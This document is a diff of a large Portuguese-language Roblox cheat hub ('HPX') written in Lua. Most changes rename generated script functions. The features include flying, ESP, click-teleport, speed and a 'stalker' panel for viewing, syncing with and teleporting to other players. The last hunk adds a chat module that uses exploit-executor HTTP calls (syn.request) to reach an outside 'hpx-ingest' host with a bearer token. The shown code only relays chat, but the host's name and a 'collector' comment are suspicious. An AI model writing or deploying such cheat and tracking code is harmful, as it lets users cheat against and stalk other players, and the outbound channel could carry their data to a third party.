     local script = Instance.new("LocalScript")
     script.Name = "LocalScript"
     script.Parent = Converted["_platformLabel"]
@@ -3132,7 +3338,7 @@ local function QSTJ_fake_script() -- Fake Script: StarterGui.ScreenGui.mainFrame
 	
 	platformLabel.Text = "PLATAFORMA: " .. plataforma
 end
-local function BJHMYK_fake_script() -- Fake Script: StarterGui.ScreenGui.mainFrame.movi.AtalhosManager
+local function KFPW_fake_script() -- Fake Script: StarterGui.ScreenGui.mainFrame.movi.AtalhosManager
     local script = Instance.new("LocalScript")
     script.Name = "AtalhosManager"
     script.Parent = Converted["_movi"]
@@ -3147,7 +3353,7 @@ local function BJHMYK_fake_script() -- Fake Script: StarterGui.ScreenGui.mainFra
 
 	_G.HPX_Atalhos = _G.HPX_Atalhos or {}
 end
-local function EXTBBL_fake_script() -- Fake Script: StarterGui.ScreenGui.mainFrame.movi.ScrollingFrame.reverseButton.LocalScript
+local function XJWRA_fake_script() -- Fake Script: StarterGui.ScreenGui.mainFrame.movi.ScrollingFrame.reverseButton.LocalScript
     local script = Instance.new("LocalScript")
     script.Name = "LocalScript"
     script.Parent = Converted["_reverseButton"]
@@ -4071,7 +4277,7 @@ local function EXTBBL_fake_script() -- Fake Script: StarterGui.ScreenGui.mainFra
 		task.spawn(setup, player.Character)
 	end
 end
-local function FHZPOS_fake_script() -- Fake Script: StarterGui.ScreenGui.mainFrame.movi.ScrollingFrame.femotesButton.LocalScript
+local function OHFO_fake_script() -- Fake Script: StarterGui.ScreenGui.mainFrame.movi.ScrollingFrame.femotesButton.LocalScript
     local script = Instance.new("LocalScript")
     script.Name = "LocalScript"
     script.Parent = Converted["_femotesButton"]
@@ -4632,7 +4838,7 @@ local function FHZPOS_fake_script() -- Fake Script: StarterGui.ScreenGui.mainFra
 	
 	task.spawn(carregarEmotesDoPlayer)
 end
-local function IQNG_fake_script() -- Fake Script: StarterGui.ScreenGui.mainFrame.movi.ScrollingFrame.clicktpButton.LocalScript
+local function BWWAVSL_fake_script() -- Fake Script: StarterGui.ScreenGui.mainFrame.movi.ScrollingFrame.clicktpButton.LocalScript
     local script = Instance.new("LocalScript")
     script.Name = "LocalScript"
     script.Parent = Converted["_clicktpButton"]
@@ -5171,7 +5377,7 @@ local function IQNG_fake_script() -- Fake Script: StarterGui.ScreenGui.mainFrame
 	atualizarAtalho()
 	
 end
-local function MFWBYRV_fake_script() -- Fake Script: StarterGui.ScreenGui.mainFrame.movi.ScrollingFrame.VoarButton.Fly
+local function EXKL_fake_script() -- Fake Script: StarterGui.ScreenGui.mainFrame.movi.ScrollingFrame.VoarButton.Fly
     local script = Instance.new("LocalScript")
     script.Name = "Fly"
     script.Parent = Converted["_VoarButton"]
@@ -14919,7 +15125,7 @@ local function MFWBYRV_fake_script() -- Fake Script: StarterGui.ScreenGui.mainFr
 	end
 	
 end
-local function WOXYDX_fake_script() -- Fake Script: StarterGui.ScreenGui.mainFrame.movi.ScrollingFrame.FantasmaVerButton.LocalScript
+local function CVOG_fake_script() -- Fake Script: StarterGui.ScreenGui.mainFrame.movi.ScrollingFrame.FantasmaVerButton.LocalScript
     local script = Instance.new("LocalScript")
     script.Name = "LocalScript"
     script.Parent = Converted["_FantasmaVerButton"]
@@ -15891,7 +16097,7 @@ local function WOXYDX_fake_script() -- Fake Script: StarterGui.ScreenGui.mainFra
 	atualizarBotao()
 	
 end
-local function TADXN_fake_script() -- Fake Script: StarterGui.ScreenGui.mainFrame.movi.ScrollingFrame.EspButton.LocalScript
+local function CVEJW_fake_script() -- Fake Script: StarterGui.ScreenGui.mainFrame.movi.ScrollingFrame.EspButton.LocalScript
     local script = Instance.new("LocalScript")
     script.Name = "LocalScript"
     script.Parent = Converted["_EspButton"]
@@ -16403,7 +16609,7 @@ local function TADXN_fake_script() -- Fake Script: StarterGui.ScreenGui.mainFram
 	
 	atualizarBotoes()
 end
-local function PKRC_fake_script() -- Fake Script: StarterGui.ScreenGui.mainFrame.movi.ScrollingFrame.antiflingButton.LocalScript
+local function AUIH_fake_script() -- Fake Script: StarterGui.ScreenGui.mainFrame.movi.ScrollingFrame.antiflingButton.LocalScript
     local script = Instance.new("LocalScript")
     script.Name = "LocalScript"
     script.Parent = Converted["_antiflingButton"]
@@ -16897,7 +17103,7 @@ local function PKRC_fake_script() -- Fake Script: StarterGui.ScreenGui.mainFrame
 	atualizarTextoTecla()
 	atualizarBotao()
 end
-local function FQOGCUY_fake_script() -- Fake Script: StarterGui.ScreenGui.mainFrame.movi.ScrollingFrame.RunButton.LocalScript
+local function SFSGIWG_fake_script() -- Fake Script: StarterGui.ScreenGui.mainFrame.movi.ScrollingFrame.RunButton.LocalScript
     local script = Instance.new("LocalScript")
     script.Name = "LocalScript"
     script.Parent = Converted["_RunButton"]
@@ -17182,7 +17388,7 @@ local function FQOGCUY_fake_script() -- Fake Script: StarterGui.ScreenGui.mainFr
 	print('[HPX CORRER] Scale pronto. Atalho e velocidade configuraveis.')
 	
 end
-local function RGNKN_fake_script() -- Fake Script: StarterGui.ScreenGui.mainFrame.movi.ScrollingFrame.GirarButton.LocalScript
+local function ZRCJIW_fake_script() -- Fake Script: StarterGui.ScreenGui.mainFrame.movi.ScrollingFrame.GirarButton.LocalScript
     local script = Instance.new("LocalScript")
     script.Name = "LocalScript"
     script.Parent = Converted["_GirarButton"]
@@ -17566,7 +17772,7 @@ local function RGNKN_fake_script() -- Fake Script: StarterGui.ScreenGui.mainFram
 	print('[HPX GIRAR] Pronto. Tentativa de registrar Spin no HumanoidDescription ativa.')
 	
 end
-local function XLQKO_fake_script() -- Fake Script: StarterGui.ScreenGui.mainFrame.anima��es.vampiro.LocalScript
+local function URCY_fake_script() -- Fake Script: StarterGui.ScreenGui.mainFrame.anima��es.vampiro.LocalScript
     local script = Instance.new("LocalScript")
     script.Name = "LocalScript"
     script.Parent = Converted["_vampiro"]
@@ -17618,7 +17824,7 @@ local function XLQKO_fake_script() -- Fake Script: StarterGui.ScreenGui.mainFram
 	
 	button.MouseButton1Click:Connect(aplicarAnimacao)
 end
-local function HUKUDMQ_fake_script() -- Fake Script: StarterGui.ScreenGui.mainFrame.anima��es.zumbie.LocalScript
+local function IWLRQRL_fake_script() -- Fake Script: StarterGui.ScreenGui.mainFrame.anima��es.zumbie.LocalScript
     local script = Instance.new("LocalScript")
     script.Name = "LocalScript"
     script.Parent = Converted["_zumbie"]
@@ -17670,7 +17876,7 @@ local function HUKUDMQ_fake_script() -- Fake Script: StarterGui.ScreenGui.mainFr
 	
 	button.MouseButton1Click:Connect(aplicarAnimacao)
 end
-local function DCVJI_fake_script() -- Fake Script: StarterGui.ScreenGui.mainFrame.anima��es.adidas.LocalScript
+local function ARYWG_fake_script() -- Fake Script: StarterGui.ScreenGui.mainFrame.anima��es.adidas.LocalScript
     local script = Instance.new("LocalScript")
     script.Name = "LocalScript"
     script.Parent = Converted["_adidas"]
@@ -17722,7 +17928,7 @@ local function DCVJI_fake_script() -- Fake Script: StarterGui.ScreenGui.mainFram
 	
 	button.MouseButton1Click:Connect(aplicarAnimacao)
 end
-local function UEZX_fake_script() -- Fake Script: StarterGui.ScreenGui.mainFrame.anima��es.Bolhoso.LocalScript
+local function XCLSGT_fake_script() -- Fake Script: StarterGui.ScreenGui.mainFrame.anima��es.Bolhoso.LocalScript
     local script = Instance.new("LocalScript")
     script.Name = "LocalScript"
     script.Parent = Converted["_Bolhoso"]
@@ -17802,7 +18008,7 @@ local function UEZX_fake_script() -- Fake Script: StarterGui.ScreenGui.mainFrame
 	
 	button.MouseButton1Click:Connect(aplicarAnimacao)
 end
-local function FXTZK_fake_script() -- Fake Script: StarterGui.ScreenGui.mainFrame.anima��es.ninja.LocalScript
+local function KQJFJ_fake_script() -- Fake Script: StarterGui.ScreenGui.mainFrame.anima��es.ninja.LocalScript
     local script = Instance.new("LocalScript")
     script.Name = "LocalScript"
     script.Parent = Converted["_ninja"]
@@ -17873,7 +18079,7 @@ local function FXTZK_fake_script() -- Fake Script: StarterGui.ScreenGui.mainFram
 	
 	button.MouseButton1Click:Connect(aplicarAnimacao)
 end
-local function RZYPJG_fake_script() -- Fake Script: StarterGui.ScreenGui.mainFrame.anima��es.lobo.LocalScript
+local function UIRLGPY_fake_script() -- Fake Script: StarterGui.ScreenGui.mainFrame.anima��es.lobo.LocalScript
     local script = Instance.new("LocalScript")
     script.Name = "LocalScript"
     script.Parent = Converted["_lobo"]
@@ -17944,7 +18150,7 @@ local function RZYPJG_fake_script() -- Fake Script: StarterGui.ScreenGui.mainFra
 	
 	button.MouseButton1Click:Connect(aplicarAnimacao)
 end
-local function RCOEBZ_fake_script() -- Fake Script: StarterGui.ScreenGui.mainFrame.anima��es.mago.LocalScript
+local function VHMHF_fake_script() -- Fake Script: StarterGui.ScreenGui.mainFrame.anima��es.mago.LocalScript
     local script = Instance.new("LocalScript")
     script.Name = "LocalScript"
     script.Parent = Converted["_mago"]
@@ -18031,7 +18237,7 @@ local function RCOEBZ_fake_script() -- Fake Script: StarterGui.ScreenGui.mainFra
 	
 	button.MouseButton1Click:Connect(aplicarAnimacao)
 end
-local function DEFPBD_fake_script() -- Fake Script: StarterGui.ScreenGui.mainFrame.anima��es.levitar.LocalScript
+local function TBUD_fake_script() -- Fake Script: StarterGui.ScreenGui.mainFrame.anima��es.levitar.LocalScript
     local script = Instance.new("LocalScript")
     script.Name = "LocalScript"
     script.Parent = Converted["_levitar"]
@@ -18102,7 +18308,7 @@ local function DEFPBD_fake_script() -- Fake Script: StarterGui.ScreenGui.mainFra
 	
 	button.MouseButton1Click:Connect(aplicarAnimacao)
 end
-local function NDUR_fake_script() -- Fake Script: StarterGui.ScreenGui.mainFrame.anima��es.cartoon.LocalScript
+local function KSYWZNE_fake_script() -- Fake Script: StarterGui.ScreenGui.mainFrame.anima��es.cartoon.LocalScript
     local script = Instance.new("LocalScript")
     script.Name = "LocalScript"
     script.Parent = Converted["_cartoon"]
@@ -18173,7 +18379,7 @@ local function NDUR_fake_script() -- Fake Script: StarterGui.ScreenGui.mainFrame
 	
 	button.MouseButton1Click:Connect(aplicarAnimacao)
 end
-local function TMRNBA_fake_script() -- Fake Script: StarterGui.ScreenGui.mainFrame.anima��es.amazon.LocalScript
+local function HUUL_fake_script() -- Fake Script: StarterGui.ScreenGui.mainFrame.anima��es.amazon.LocalScript
     local script = Instance.new("LocalScript")
     script.Name = "LocalScript"
     script.Parent = Converted["_amazon"]
@@ -18259,7 +18465,7 @@ local function TMRNBA_fake_script() -- Fake Script: StarterGui.ScreenGui.mainFra
 	
 	button.MouseButton1Click:Connect(aplicarAnimacao)
 end
-local function LEXO_fake_script() -- Fake Script: StarterGui.ScreenGui.mainFrame.anima��es.astronauta.LocalScript
+local function QIDZUU_fake_script() -- Fake Script: StarterGui.ScreenGui.mainFrame.anima��es.astronauta.LocalScript
     local script = Instance.new("LocalScript")
     script.Name = "LocalScript"
     script.Parent = Converted["_astronauta"]
@@ -18345,7 +18551,7 @@ local function LEXO_fake_script() -- Fake Script: StarterGui.ScreenGui.mainFrame
 	
 	button.MouseButton1Click:Connect(aplicarAnimacao)
 end
-local function HFJODX_fake_script() -- Fake Script: StarterGui.ScreenGui.mainFrame.anima��es.superhero.LocalScript
+local function ZJPKX_fake_script() -- Fake Script: StarterGui.ScreenGui.mainFrame.anima��es.superhero.LocalScript
     local script = Instance.new("LocalScript")
     script.Name = "LocalScript"
     script.Parent = Converted["_superhero"]
@@ -18431,7 +18637,7 @@ local function HFJODX_fake_script() -- Fake Script: StarterGui.ScreenGui.mainFra
 	
 	button.MouseButton1Click:Connect(aplicarAnimacao)
 end
-local function MMAYC_fake_script() -- Fake Script: StarterGui.ScreenGui.mainFrame.anima��es.antiga.LocalScript
+local function UEVGX_fake_script() -- Fake Script: StarterGui.ScreenGui.mainFrame.anima��es.antiga.LocalScript
     local script = Instance.new("LocalScript")
     script.Name = "LocalScript"
     script.Parent = Converted["_antiga"]
@@ -18510,7 +18716,7 @@ local function MMAYC_fake_script() -- Fake Script: StarterGui.ScreenGui.mainFram
 	
 	button.MouseButton1Click:Connect(aplicarAnimacao)
 end
-local function IHGS_fake_script() -- Fake Script: StarterGui.ScreenGui.mainFrame.anima��es.Estileira.LocalScript
+local function WIAWJTR_fake_script() -- Fake Script: StarterGui.ScreenGui.mainFrame.anima��es.Estileira.LocalScript
     local script = Instance.new("LocalScript")
     script.Name = "LocalScript"
     script.Parent = Converted["_Estileira"]
@@ -18589,7 +18795,7 @@ local function IHGS_fake_script() -- Fake Script: StarterGui.ScreenGui.mainFrame
 	
 	button.MouseButton1Click:Connect(aplicarAnimacao)
 end
-local function MFHEIPQ_fake_script() -- Fake Script: StarterGui.ScreenGui.mainFrame.anima��es.Rob�.LocalScript
+local function ZFRVM_fake_script() -- Fake Script: StarterGui.ScreenGui.mainFrame.anima��es.Rob�.LocalScript
     local script = Instance.new("LocalScript")
     script.Name = "LocalScript"
     script.Parent = Converted["_Rob�"]
@@ -18668,7 +18874,7 @@ local function MFHEIPQ_fake_script() -- Fake Script: StarterGui.ScreenGui.mainFr
 	
 	button.MouseButton1Click:Connect(aplicarAnimacao)
 end
-local function JVHIR_fake_script() -- Fake Script: StarterGui.ScreenGui.mainFrame.anima��es.Elf.LocalScript
+local function APJBDMP_fake_script() -- Fake Script: StarterGui.ScreenGui.mainFrame.anima��es.Elf.LocalScript
     local script = Instance.new("LocalScript")
     script.Name = "LocalScript"
     script.Parent = Converted["_Elf"]
@@ -18747,7 +18953,7 @@ local function JVHIR_fake_script() -- Fake Script: StarterGui.ScreenGui.mainFram
 	
 	button.MouseButton1Click:Connect(aplicarAnimacao)
 end
-local function CGTGX_fake_script() -- Fake Script: StarterGui.ScreenGui.mainFrame.anima��es.Velho.LocalScript
+local function XPHUOYN_fake_script() -- Fake Script: StarterGui.ScreenGui.mainFrame.anima��es.Velho.LocalScript
     local script = Instance.new("LocalScript")
     script.Name = "LocalScript"
     script.Parent = Converted["_Velho"]
@@ -18831,7 +19037,7 @@ local function CGTGX_fake_script() -- Fake Script: StarterGui.ScreenGui.mainFram
 	
 	button.MouseButton1Click:Connect(aplicarAnimacao)
 end
-local function OLMIW_fake_script() -- Fake Script: StarterGui.ScreenGui.mainFrame.anima��es.Walmart.LocalScript
+local function CUODQZ_fake_script() -- Fake Script: StarterGui.ScreenGui.mainFrame.anima��es.Walmart.LocalScript
     local script = Instance.new("LocalScript")
     script.Name = "LocalScript"
     script.Parent = Converted["_Walmart"]
@@ -18911,7 +19117,7 @@ local function OLMIW_fake_script() -- Fake Script: StarterGui.ScreenGui.mainFram
 	button.MouseButton1Click:Connect(aplicarAnimacao)
 	
 end
-local function VKFLER_fake_script() -- Fake Script: StarterGui.ScreenGui.mainFrame.anima��es.malvada.LocalScript
+local function NGJCJCV_fake_script() -- Fake Script: StarterGui.ScreenGui.mainFrame.anima��es.malvada.LocalScript
     local script = Instance.new("LocalScript")
     script.Name = "LocalScript"
     script.Parent = Converted["_malvada"]
@@ -18989,7 +19195,7 @@ local function VKFLER_fake_script() -- Fake Script: StarterGui.ScreenGui.mainFra
 	
 	button.MouseButton1Click:Connect(aplicarAnimacao)
 end
-local function NKPHV_fake_script() -- Fake Script: StarterGui.ScreenGui.mainFrame.anima��es.Brinquedo.LocalScript
+local function ZPHVU_fake_script() -- Fake Script: StarterGui.ScreenGui.mainFrame.anima��es.Brinquedo.LocalScript
     local script = Instance.new("LocalScript")
     script.Name = "LocalScript"
     script.Parent = Converted["_Brinquedo"]
@@ -19076,7 +19282,7 @@ local function NKPHV_fake_script() -- Fake Script: StarterGui.ScreenGui.mainFram
 	
 	button.MouseButton1Click:Connect(aplicarAnimacao)
 end
-local function YSVRO_fake_script() -- Fake Script: StarterGui.ScreenGui.mainFrame.anima��es.superhero.LocalScript
+local function JMGETY_fake_script() -- Fake Script: StarterGui.ScreenGui.mainFrame.anima��es.superhero.LocalScript
     local script = Instance.new("LocalScript")
     script.Name = "LocalScript"
     script.Parent = Converted["_superhero1"]
@@ -19155,7 +19361,7 @@ local function YSVRO_fake_script() -- Fake Script: StarterGui.ScreenGui.mainFram
 	
 	button.MouseButton1Click:Connect(aplicarAnimacao)
 end
-local function UDHG_fake_script() -- Fake Script: StarterGui.ScreenGui.mainFrame.anima��es.Through Life.LocalScript
+local function TDSOAI_fake_script() -- Fake Script: StarterGui.ScreenGui.mainFrame.anima��es.Through Life.LocalScript
     local script = Instance.new("LocalScript")
     script.Name = "LocalScript"
     script.Parent = Converted["_Through Life"]
@@ -19234,7 +19440,7 @@ local function UDHG_fake_script() -- Fake Script: StarterGui.ScreenGui.mainFrame
 	
 	button.MouseButton1Click:Connect(aplicarAnimacao)
 end
-local function JSJTL_fake_script() -- Fake Script: StarterGui.ScreenGui.mainFrame.anima��es.superhero.LocalScript
+local function LQPFQ_fake_script() -- Fake Script: StarterGui.ScreenGui.mainFrame.anima��es.superhero.LocalScript
     local script = Instance.new("LocalScript")
     script.Name = "LocalScript"
     script.Parent = Converted["_superhero2"]
@@ -19313,7 +19519,7 @@ local function JSJTL_fake_script() -- Fake Script: StarterGui.ScreenGui.mainFram
 	
 	button.MouseButton1Click:Connect(aplicarAnimacao)
 end
-local function QAMNIH_fake_script() -- Fake Script: StarterGui.ScreenGui.mainFrame.anima��es.Glow.LocalScript
+local function IMEV_fake_script() -- Fake Script: StarterGui.ScreenGui.mainFrame.anima��es.Glow.LocalScript
     local script = Instance.new("LocalScript")
     script.Name = "LocalScript"
     script.Parent = Converted["_Glow"]
@@ -19393,7 +19599,7 @@ local function QAMNIH_fake_script() -- Fake Script: StarterGui.ScreenGui.mainFra
 	
 	button.MouseButton1Click:Connect(aplicarAnimacao)
 end
-local function YDJJVHB_fake_script() -- Fake Script: StarterGui.ScreenGui.mainFrame.voxUp.RoVibes.GrimoryButton.LocalScript
+local function XGLI_fake_script() -- Fake Script: StarterGui.ScreenGui.mainFrame.voxUp.RoVibes.GrimoryButton.LocalScript
     local script = Instance.new("LocalScript")
     script.Name = "LocalScript"
     script.Parent = Converted["_GrimoryButton"]
@@ -19991,7 +20197,7 @@ local function YDJJVHB_fake_script() -- Fake Script: StarterGui.ScreenGui.mainFr
 	print("[HPX GRIM] Pronto: GrimoryButton + atalho configuravel, sem painel extra.")
 	
 end
-local function KXFIELO_fake_script() -- Fake Script: StarterGui.ScreenGui.mainFrame.voxUp.RoVibes.CandyButton.LocalScript
+local function VRPWJ_fake_script() -- Fake Script: StarterGui.ScreenGui.mainFrame.voxUp.RoVibes.CandyButton.LocalScript
     local script = Instance.new("LocalScript")
     script.Name = "LocalScript"
     script.Parent = Converted["_CandyButton"]
@@ -20725,7 +20931,7 @@ local function KXFIELO_fake_script() -- Fake Script: StarterGui.ScreenGui.mainFr
 	conectarPasta()
 	
 end
-local function GGUKY_fake_script() -- Fake Script: StarterGui.ScreenGui.mainFrame.voxUp.RoVibes.BoneButton.LocalScript
+local function XARQ_fake_script() -- Fake Script: StarterGui.ScreenGui.mainFrame.voxUp.RoVibes.BoneButton.LocalScript
     local script = Instance.new("LocalScript")
     script.Name = "LocalScript"
     script.Parent = Converted["_BoneButton"]
@@ -22188,7 +22394,7 @@ local function GGUKY_fake_script() -- Fake Script: StarterGui.ScreenGui.mainFram
 	print("[HPX BONES] Painel conectado. Use BoneButton e defina a tecla no campo.")
 	
 end
-local function ZASZ_fake_script() -- Fake Script: StarterGui.ScreenGui.mainFrame.voxUp.RoVibes.LoboButton.LocalScript
+local function CSQIWDT_fake_script() -- Fake Script: StarterGui.ScreenGui.mainFrame.voxUp.RoVibes.LoboButton.LocalScript
     local script = Instance.new("LocalScript")
     script.Name = "LocalScript"
     script.Parent = Converted["_LoboButton"]
@@ -23088,7 +23294,7 @@ local function ZASZ_fake_script() -- Fake Script: StarterGui.ScreenGui.mainFrame
 	
 	
 end
-local function KOSE_fake_script() -- Fake Script: StarterGui.ScreenGui.mainFrame.voxUp.RoVibes.LuckButton.LocalScript
+local function AKTV_fake_script() -- Fake Script: StarterGui.ScreenGui.mainFrame.voxUp.RoVibes.LuckButton.LocalScript
     local script = Instance.new("LocalScript")
     script.Name = "LocalScript"
     script.Parent = Converted["_LuckButton"]
@@ -23439,7 +23645,7 @@ local function KOSE_fake_script() -- Fake Script: StarterGui.ScreenGui.mainFrame
 	return app
 	
 end
-local function LVTJTU_fake_script() -- Fake Script: StarterGui.ScreenGui.mainFrame.stalker.LocalScript
+local function UWJLTHD_fake_script() -- Fake Script: StarterGui.ScreenGui.mainFrame.stalker.LocalScript
     local script = Instance.new("LocalScript")
     script.Name = "LocalScript"
     script.Parent = Converted["_stalker"]
@@ -24269,7 +24475,7 @@ local function LVTJTU_fake_script() -- Fake Script: StarterGui.ScreenGui.mainFra
 	end
 	
 end
-local function TNITP_fake_script() -- Fake Script: StarterGui.ScreenGui.mainFrame.stalker.SeachBox.seach
+local function XGWUMB_fake_script() -- Fake Script: StarterGui.ScreenGui.mainFrame.stalker.SeachBox.seach
     local script = Instance.new("LocalScript")
     script.Name = "seach"
     script.Parent = Converted["_SeachBox"]
@@ -24355,7 +24561,7 @@ local function TNITP_fake_script() -- Fake Script: StarterGui.ScreenGui.mainFram
 	end)
 	
 end
-local function CYLHVIT_fake_script() -- Fake Script: StarterGui.ScreenGui.mainFrame.stalker.Cmds.verButton.LocalScript
+local function ZMFHV_fake_script() -- Fake Script: StarterGui.ScreenGui.mainFrame.stalker.Cmds.verButton.LocalScript
     local script = Instance.new("LocalScript")
     script.Name = "LocalScript"
     script.Parent = Converted["_verButton"]
@@ -24495,7 +24701,7 @@ local function CYLHVIT_fake_script() -- Fake Script: StarterGui.ScreenGui.mainFr
 		end
 	end)
 end
-local function GIOGBU_fake_script() -- Fake Script: StarterGui.ScreenGui.mainFrame.stalker.Cmds.syncButton.LocalScript
+local function RCFCN_fake_script() -- Fake Script: StarterGui.ScreenGui.mainFrame.stalker.Cmds.syncButton.LocalScript
     local script = Instance.new("LocalScript")
     script.Name = "LocalScript"
     script.Parent = Converted["_syncButton"]
@@ -24744,7 +24950,7 @@ local function GIOGBU_fake_script() -- Fake Script: StarterGui.ScreenGui.mainFra
 		end
 	end)
 end
-local function XJSOBR_fake_script() -- Fake Script: StarterGui.ScreenGui.mainFrame.stalker.Cmds.TpButton.LocalScript
+local function UWZQY_fake_script() -- Fake Script: StarterGui.ScreenGui.mainFrame.stalker.Cmds.TpButton.LocalScript
     local script = Instance.new("LocalScript")
     script.Name = "LocalScript"
     script.Parent = Converted["_TpButton"]
@@ -24812,7 +25018,7 @@ local function XJSOBR_fake_script() -- Fake Script: StarterGui.ScreenGui.mainFra
 	
 	tpButton.MouseButton1Click:Connect(teleportar)
 end
-local function NYBXBH_fake_script() -- Fake Script: StarterGui.ScreenGui.mainFrame.stalker.Cmds.carinhoButton.LocalScript
+local function TZZIYNW_fake_script() -- Fake Script: StarterGui.ScreenGui.mainFrame.stalker.Cmds.carinhoButton.LocalScript
     local script = Instance.new("LocalScript")
     script.Name = "LocalScript"
     script.Parent = Converted["_carinhoButton"]
@@ -25250,56 +25456,278 @@ local function NYBXBH_fake_script() -- Fake Script: StarterGui.ScreenGui.mainFra
 	print("[HPX CARINHO] V2 carregado corretamente!")
 	
 end
+local function AUYI_fake_script() -- Fake Script: StarterGui.ScreenGui.mainFrame.ChatFrame.Chat.LocalScript
+    local script = Instance.new("LocalScript")
+    script.Name = "LocalScript"
+    script.Parent = Converted["_Chat"]
+    local req = require
+    local require = function(obj)
+        local fake = fake_module_scripts[obj]
+        if fake then
+            return fake()
+        end
+        return req(obj)
+    end
 
-coroutine.wrap(LKAKVQ_fake_script)()
-coroutine.wrap(HPNV_fake_script)()
-coroutine.wrap(LCPU_fake_script)()
-coroutine.wrap(ZCKTRJ_fake_script)()
-coroutine.wrap(EJRWW_fake_script)()
-coroutine.wrap(NAMWM_fake_script)()
-coroutine.wrap(QSTJ_fake_script)()
-coroutine.wrap(BJHMYK_fake_script)()
-coroutine.wrap(EXTBBL_fake_script)()
-coroutine.wrap(FHZPOS_fake_script)()
-coroutine.wrap(IQNG_fake_script)()
-coroutine.wrap(MFWBYRV_fake_script)()
-coroutine.wrap(WOXYDX_fake_script)()
-coroutine.wrap(TADXN_fake_script)()
-coroutine.wrap(PKRC_fake_script)()
-coroutine.wrap(FQOGCUY_fake_script)()
-coroutine.wrap(RGNKN_fake_script)()
-coroutine.wrap(XLQKO_fake_script)()
-coroutine.wrap(HUKUDMQ_fake_script)()
-coroutine.wrap(DCVJI_fake_script)()
-coroutine.wrap(UEZX_fake_script)()
-coroutine.wrap(FXTZK_fake_script)()
-coroutine.wrap(RZYPJG_fake_script)()
-coroutine.wrap(RCOEBZ_fake_script)()
-coroutine.wrap(DEFPBD_fake_script)()
-coroutine.wrap(NDUR_fake_script)()
-coroutine.wrap(TMRNBA_fake_script)()
-coroutine.wrap(LEXO_fake_script)()
-coroutine.wrap(HFJODX_fake_script)()
-coroutine.wrap(MMAYC_fake_script)()
-coroutine.wrap(IHGS_fake_script)()
-coroutine.wrap(MFHEIPQ_fake_script)()
-coroutine.wrap(JVHIR_fake_script)()
-coroutine.wrap(CGTGX_fake_script)()
-coroutine.wrap(OLMIW_fake_script)()
-coroutine.wrap(VKFLER_fake_script)()
-coroutine.wrap(NKPHV_fake_script)()
-coroutine.wrap(YSVRO_fake_script)()
-coroutine.wrap(UDHG_fake_script)()
-coroutine.wrap(JSJTL_fake_script)()
-coroutine.wrap(QAMNIH_fake_script)()
-coroutine.wrap(YDJJVHB_fake_script)()
-coroutine.wrap(KXFIELO_fake_script)()
-coroutine.wrap(GGUKY_fake_script)()
-coroutine.wrap(ZASZ_fake_script)()
-coroutine.wrap(KOSE_fake_script)()
-coroutine.wrap(LVTJTU_fake_script)()
-coroutine.wrap(TNITP_fake_script)()
-coroutine.wrap(CYLHVIT_fake_script)()
-coroutine.wrap(GIOGBU_fake_script)()
-coroutine.wrap(XJSOBR_fake_script)()
-coroutine.wrap(NYBXBH_fake_script)()-- Please leave these comments in and leave credit, it took me a while to make this
+	-- HPX Global Chat
+	-- O coletor precisa expor GET/POST em /api/chat/messages.
+	
+	local Players = game:GetService("Players")
+	local HttpService = game:GetService("HttpService")
+	
+	local API_BASE = "https://hpx-ingest-7f2a.pointyoak1.chatgpt.site"
+	local player = Players.LocalPlayer
+	local http = request or http_request or (syn and syn.request)
+	if not player then return end
+	
+	local function call(method, path, body, token)
+		if not http then return nil end
+		local headers = { ["Content-Type"] = "application/json" }
+		if token then headers.Authorization = "Bearer " .. token end
+		local ok, response = pcall(http, {
+			Url = API_BASE .. path,
+			Method = method,
+			Headers = headers,
+			Body = body and HttpService:JSONEncode(body) or nil
+		})
+		if not ok or not response or not response.Body then return nil end
+		local decodedOk, decoded = pcall(HttpService.JSONDecode, HttpService, response.Body)
+		return decodedOk and decoded or nil
+	end
+	
+	local function findChat()
+		local gui = player:FindFirstChildOfClass("PlayerGui")
+		local main = gui and gui:FindFirstChild("mainFrame", true)
+		local config = main and main:FindFirstChild("configUS", true)
+		return config and config:FindFirstChild("Chat", true)
+	end
+	
+	local chat = findChat()
+	if not chat then
+		local gui = player:WaitForChild("PlayerGui")
+		gui.DescendantAdded:Connect(function(obj)
+			if obj.Name == "Chat" then task.defer(function() if not chat then chat = obj end end) end
+		end)
+		repeat task.wait(0.5); chat = findChat() until chat
+	end
+	
+	local online = chat:FindFirstChild("HPXChatOnline") or Instance.new("TextLabel")
+	online.Name = "HPXChatOnline"
+	online.BackgroundTransparency = 1
+	online.Position = UDim2.new(1, -66, 0, 5)
+	online.Size = UDim2.new(0, 58, 0, 24)
+	online.Text = "?? 0"
+	online.TextColor3 = Color3.fromRGB(120, 255, 170)
+	online.Font = Enum.Font.GothamBold
+	online.TextSize = 14
+	online.TextXAlignment = Enum.TextXAlignment.Right
+	online.Parent = chat
+	
+	local typing = chat:FindFirstChild("HPXChatTyping") or Instance.new("TextLabel")
+	typing.Name = "HPXChatTyping"
+	typing.BackgroundTransparency = 1
+	typing.Position = UDim2.new(0, 8, 1, -68)
+	typing.Size = UDim2.new(1, -80, 0, 22)
+	typing.Text = ""
+	typing.TextColor3 = Color3.fromRGB(170, 180, 200)
+	typing.Font = Enum.Font.Gotham
+	typing.TextSize = 12
+	typing.TextXAlignment = Enum.TextXAlignment.Left
+	typing.Parent = chat
+	
+	local messages = chat:FindFirstChild("Messages") or Instance.new("ScrollingFrame")
+	messages.Name = "Messages"
+	messages.BackgroundTransparency = 1
+	messages.BorderSizePixel = 0
+	messages.Position = UDim2.new(0, 8, 0, 8)
+	messages.Size = UDim2.new(1, -16, 1, -82)
+	messages.CanvasSize = UDim2.new()
+	messages.AutomaticCanvasSize = Enum.AutomaticSize.Y
+	messages.ScrollBarThickness = 4
+	messages.Parent = chat
+	
+	local layout = messages:FindFirstChildOfClass("UIListLayout") or Instance.new("UIListLayout")
+	layout.Padding = UDim.new(0, 5)
+	layout.SortOrder = Enum.SortOrder.LayoutOrder
+	layout.Parent = messages
+	
+	local input = chat:FindFirstChild("MessageInput") or Instance.new("TextBox")
+	input.Name = "MessageInput"
+	input.PlaceholderText = "Digite uma mensagem..."
+	input.Text = ""
+	input.ClearTextOnFocus = false
+	input.TextScaled = false
+	input.TextSize = 14
+	input.TextColor3 = Color3.new(1, 1, 1)
+	input.BackgroundColor3 = Color3.fromRGB(35, 42, 63)
+	input.BorderSizePixel = 0
+	input.Position = UDim2.new(0, 8, 1, -40)
+	input.Size = UDim2.new(1, -76, 0, 32)
+	input.Parent = chat
+	local inputCorner = input:FindFirstChildOfClass("UICorner") or Instance.new("UICorner")
+	inputCorner.CornerRadius = UDim.new(0, 9)
+	inputCorner.Parent = input
+	
+	local send = chat:FindFirstChild("SendMessage")
